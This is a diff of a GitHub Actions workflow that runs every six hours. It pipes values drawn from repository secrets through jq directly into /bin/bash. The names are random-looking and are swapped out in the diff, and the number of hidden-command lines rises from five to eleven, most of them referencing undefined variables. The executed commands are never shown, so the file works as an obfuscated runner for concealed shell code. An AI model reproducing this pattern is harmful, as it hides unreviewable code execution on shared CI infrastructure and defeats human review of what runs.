@@ -3,7 +3,7 @@ name: shengrenwuj
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 2/6 * * *'
+    - cron: '7 2/6 * * *'
 
 jobs:
   build:
@@ -12,11 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: shengrenwuj
         env:
-          eqh970: ${{ secrets.eqh970 }}
+          yt46946: ${{ secrets.yt46946 }}
         run: |
-          echo $eqh970 | jq -r .p0 | /bin/bash
-          echo $eu9486 | jq -r .s894 | /bin/bash
-          echo $cedm3836 | jq -r .lmoc34591 | /bin/bash
-          echo $w083 | jq -r .d38447 | /bin/bash
-          echo $bz25 | jq -r .xmt7290 | /bin/bash
+          echo $yt46946 | jq -r .n78517 | /bin/bash
+          echo $osupe32302 | jq -r .xpcek96 | /bin/bash
+          echo $yjez3 | jq -r .bpkpx388 | /bin/bash
+          echo $fhjf7708 | jq -r .nbnhe1384 | /bin/bash
+          echo $qzhf7 | jq -r .cori1813 | /bin/bash
+          echo $crh6244 | jq -r .swtr76 | /bin/bash
+          echo $q3 | jq -r .lzl8 | /bin/bash
+          echo $l677 | jq -r .rxg7193 | /bin/bash
+          echo $d9579 | jq -r .s04 | /bin/bash
+          echo $bwj606 | jq -r .jx8 | /bin/bash
+          echo $fzckr42126 | jq -r .rlcte0 | /bin/bash
 
